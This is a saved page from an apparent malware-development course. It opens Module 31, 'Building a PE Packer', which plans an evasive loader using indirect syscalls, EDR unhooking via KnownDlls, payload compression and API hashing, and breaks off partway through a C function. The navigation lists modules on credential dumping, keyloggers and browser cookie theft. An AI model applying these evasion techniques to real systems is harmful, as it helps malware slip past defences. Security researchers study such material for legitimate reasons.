                    <div for="module-47" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 47 - Exploiting EDRs For Evasion - EDR LOLBINS
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-48" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./48.html&amp;toc=true">
                    <div for="module-48" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 48 - Process Hypnosis
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-49" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./49.html&amp;toc=true">
                    <div for="module-49" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 49 - Introduction To Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-50" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./50.html&amp;toc=true">
                    <div for="module-50" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 50 - Writing Beacon Object Files
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-51" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./51.html&amp;toc=true">
                    <div for="module-51" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 51 - Object File Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-52" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./52.html&amp;toc=true">
                    <div for="module-52" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 52 - Exploiting EDRs For Evasion - Finding Internal Exclusion List
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-53" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./53.html&amp;toc=true">
                    <div for="module-53" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 53 - Introduction To Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-54" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./54.html&amp;toc=true">
                    <div for="module-54" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 54 - Introduction to Ekko and Zilean Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-55" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./55.html&amp;toc=true">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./56.html&amp;toc=true">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./57.html&amp;toc=true">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./58.html&amp;toc=true">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./59.html&amp;toc=true">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./60.html&amp;toc=true">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./61.html&amp;toc=true">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./62.html&amp;toc=true">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./63.html&amp;toc=true">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./64.html&amp;toc=true">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./65.html&amp;toc=true">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./66.html&amp;toc=true">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./67.html&amp;toc=true">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html&amp;toc=true">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html&amp;toc=true">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html&amp;toc=true">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html&amp;toc=true">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html&amp;toc=true">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html&amp;toc=true">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html&amp;toc=true">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html&amp;toc=true">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html&amp;toc=true">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html&amp;toc=true">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html&amp;toc=true">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html&amp;toc=true">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html&amp;toc=true">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html&amp;toc=true">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html&amp;toc=true">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./30.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html?toc=true">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./31/complete" method="POST">
         </form>
      <form id="uncomplete-module" action="./3#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./32.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>



      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos">
  </a></footer></template>

<div id="app-root">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="31_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 31 - Building a PE Packer
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="31_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="31_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="31_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="31_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="31_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/PePacker" target="_blank">
                    <img src="31_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">

    
    


    
    

    
    <div id="module-content" class="transition-opacity duration-300 opacity-100">
        <h2 id="toc-heading-0">Building A PE Packer</h2>
<h3 id="toc-heading-1">Introduction</h3>
<p>Unlike the previous PE injection modules which were more like PoCs for learning purposes, this module will integrate <em>Local PE Injection</em> and <em>PeFluctuation</em>
 modules to create a PE packer capable of loading and executing a PE 
payload in an undetectable manner. Furthermore, this module will 
incorporate methods introduced in <em>Building An Evasive DLL Payload Loader</em>, so it is advisable to review that module for a comprehensive understanding.</p>
<h3 id="toc-heading-2">Loader's Capabilities</h3>
<p>The loader being built will have the following features:</p>
<ul>
<li>
<p>Indirect-Syscalls using an improved HellsHall implementation. This feature was introduced in the <em>Building An Evasive DLL Payload Loader</em> module.</p>
</li>
<li>
<p>DLL Unhooking via the <code>\KnownDlls\</code> directory without using the <code>RWX</code> memory permissions. This feature was introduced in the <em>Building An Evasive DLL Payload Loader</em> module.</p>
</li>
<li>
<p>Using the <a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch" target="_blank">LZW</a> algorithm for PE payload compression.</p>
</li>
<li>
<p>Using PeFluctuation to hide the injected PE at runtime.</p>
</li>
<li>
<p>Obfuscated IAT using API hashing and IAT camouflage.</p>
</li>
<li>
<p>CRT library independent.</p>
</li>
</ul>
<h3 id="toc-heading-3">Using the Enhanced HellsHall</h3>
<p>In the <em>Building An Evasive DLL Payload Loader</em> module, HellsHall was enhanced to use the <code>syscall</code> instructions from the <code>win32u.dll</code> library instead of <code>ntdll.dll</code>
 to perform indirect syscalls. This allowed us to unhook DLLs without 
the need to use RWX memory permissions. The same HellsHall 
implementation will also be used in the current module. The functions 
below will be reused in this module:</p>
<ul>
<li>
<p><code>FetchNtSyscall</code> - Initializes an <code>NT_SYSCALL</code> structure of a given syscall. <code>FetchNtSyscall</code> executes <code>FetchWin32uSyscallInst</code> which retrieves a random <code>syscall</code> instruction address from within <code>win32u.dll</code>.</p>
</li>
<li>
<p><code>InitIndirectSyscalls</code> - Initializes an <code>NT_API</code> structure that will hold the required details to invoke all of the utilized syscalls in the loader. The <code>NT_API</code> structure is shown below.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_NT_API</span> 
<span class="token punctuation">{</span>
    NT_SYSCALL	NtOpenSection<span class="token punctuation">;</span>
    NT_SYSCALL	NtMapViewOfSection<span class="token punctuation">;</span>
    NT_SYSCALL	NtUnmapViewOfSection<span class="token punctuation">;</span>
    NT_SYSCALL  NtAllocateVirtualMemory<span class="token punctuation">;</span>
    NT_SYSCALL	NtProtectVirtualMemory<span class="token punctuation">;</span>
    NT_SYSCALL	NtFlushInstructionCache<span class="token punctuation">;</span>
    BOOL        bInit<span class="token punctuation">;</span>

<span class="token punctuation">}</span> NT_API<span class="token punctuation">,</span> <span class="token operator">*</span> PNT_API<span class="token punctuation">;</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Further details on how the enhanced indirect syscall technique works are discussed in the <em>Building An Evasive DLL Payload Loader</em> module.</p>
<h3 id="toc-heading-4">Unhooking Without RWX permissions</h3>
<p>In the <em>Building An Evasive DLL Payload Loader</em> module, unhooking without <code>RWX</code> permissions was done by unhooking the first three DLLs using <code>RW</code> memory permissions and retrieving their unhooked versions from the <code>\KnownDlls\</code>
 directory. In this module, the same technique will be used, however, 
the implant will unhook all the loaded DLLs after resolving the PE 
payload's IAT. This is done because resolving the IAT loads additional 
DLLs to the local process, therefore waiting until these DLLs are loaded
 before starting the unhooking routine increases the likelihood of 
removing more installed userland hooks.</p>
<p>It is worth noting that although the unhooking routine of the current
 implant will attempt to unhook all loaded DLLs, it will avoid unhooking
 the <code>win32u.dll</code> module. This is because the <code>win32u.dll</code> module is used to execute the <code>syscall</code> instruction, which if unhooked, will cause an access violation since the implant is only using <code>RW</code> memory permissions.</p>
<p>Additionally, the unhooking process will have a Vectored Exception Handler (VEH) function <code>UnhookingVectoredExceptionHandler</code> which is invoked in case a DLL attempts to execute code in non-executable memory. <code>UnhookingVectoredExceptionHandler</code> will change the memory permissions from <code>RW</code> to <code>RWX</code> and overwrite the hooked <code>.text</code> section with the unhooked version that was retrieved from the <code>\KnownDlls\</code> directory.</p>
<h3 id="toc-heading-5">API Hashing</h3>
<p>As usual, WinAPIs will be invoked by API hashing which is demonstrated by the familiar <code>GetProcAddressH</code> and <code>GetModuleHandleH</code> functions shown below.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">FARPROC <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN UINT32 uApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PBYTE                             pBase                      <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>
	PIMAGE_NT_HEADERS                 pImgNtHdrs                 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_EXPORT_DIRECTORY           pImgExportDir              <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PDWORD                            pdwFunctionNameArray       <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PDWORD                            pdwFunctionAddressArray    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PWORD                             pwFunctionOrdinalArray     <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	DWORD                             dwImgExportDirSize         <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hModule <span class="token operator">||</span> <span class="token operator">!</span>uApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBase<span class="token punctuation">)</span><span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
